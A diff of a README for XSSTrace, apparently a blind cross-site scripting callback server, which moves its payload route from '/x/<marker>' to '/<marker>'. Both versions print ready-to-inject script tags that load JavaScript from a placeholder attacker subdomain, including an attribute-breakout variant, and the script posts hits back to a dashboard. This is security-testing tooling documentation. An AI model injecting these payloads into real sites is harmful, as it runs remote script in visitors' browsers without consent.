@@ -38,18 +38,18 @@ That is the problem XSSTrace solves.
 Instead of using one generic payload path, XSSTrace lets you create unlimited marker-based payloads:
 
 ```html
-<script src="https://xss.yourdomain.com/x/signup-name"></script>
-<script src="https://xss.yourdomain.com/x/admin-note"></script>
-<script src="https://xss.yourdomain.com/x/billing-address"></script>
+<script src="https://xss.yourdomain.com/signup-name"></script>
+<script src="https://xss.yourdomain.com/admin-note"></script>
+<script src="https://xss.yourdomain.com/billing-address"></script>
 ```
 
-Everything after `/x/` is the marker. When it fires, the dashboard shows where it came from, when it triggered, and can send a Discord notification.
+Everything after the domain root is the marker. When it fires, the dashboard shows where it came from, when it triggered, and can send a Discord notification.
 
 ## What You Get
 
-- Payload route: `/x/<marker>`
+- Payload route: `/<marker>`
 - Password-protected dashboard: `/dashboard`
-- Unlimited markers, for example `/x/firstname-profile`, `/x/admin-note`, `/x/support-ticket`
+- Unlimited markers, for example `/firstname-profile`, `/admin-note`, `/support-ticket`
 - Hit grouping by page URL/site
 - Filters with suggestions for page URL, IP, and marker
 - 3-dot page actions: copy URL, cut, paste into another page group, delete
@@ -66,7 +66,7 @@ Use a dedicated subdomain:
 Main website:       https://yourdomain.com
 Blind XSS server:   https://xss.yourdomain.com
 Dashboard:          https://xss.yourdomain.com/dashboard
-Payload base:       https://xss.yourdomain.com/x/<marker>
+Payload base:       https://xss.yourdomain.com/<marker>
 ```
 
 Do not put this behind a static host. It needs a backend because it receives and stores callbacks.
@@ -322,16 +322,16 @@ The dashboard gives you:
 Basic marker:
 
 ```html
-<script src="https://xss.yourdomain.com/x/blind-xss"></script>
+<script src="https://xss.yourdomain.com/blind-xss"></script>
 ```
 
 Marker per injection point:
 
 ```html
-<script src="https://xss.yourdomain.com/x/signup-name"></script>
-<script src="https://xss.yourdomain.com/x/profile-bio"></script>
-<script src="https://xss.yourdomain.com/x/admin-note"></script>
-<script src="https://xss.yourdomain.com/x/billing-address"></script>
+<script src="https://xss.yourdomain.com/signup-name"></script>
+<script src="https://xss.yourdomain.com/profile-bio"></script>
+<script src="https://xss.yourdomain.com/admin-note"></script>
+<script src="https://xss.yourdomain.com/billing-address"></script>
 ```
 
 The dashboard groups hits by page URL and shows the marker so you know exactly which payload fired.
@@ -339,7 +339,7 @@ The dashboard groups hits by page URL and shows the marker so you know exactly w
 The payload builder can also produce a two-script variant:
 
 ```html
-<script src="https://xss.yourdomain.com/x/blind-xss"></script>"/><script src="https://xss.yourdomain.com/x/blind-xss1"></script>
+<script src="https://xss.yourdomain.com/blind-xss"></script>"/><script src="https://xss.yourdomain.com/blind-xss1"></script>
 ```
 
 This can help in some broken HTML contexts where one form of injection closes/escapes differently than another.
@@ -361,7 +361,7 @@ Source types:
 
 | Source | Meaning |
 | --- | --- |
-| `payload-load` | The `/x/<marker>` JavaScript URL was requested |
+| `payload-load` | The `/<marker>` JavaScript URL was requested |
 | `script` | The JavaScript executed and posted back |
 | `image` | The image fallback fired |
 | `import` | The hit came from an imported log |
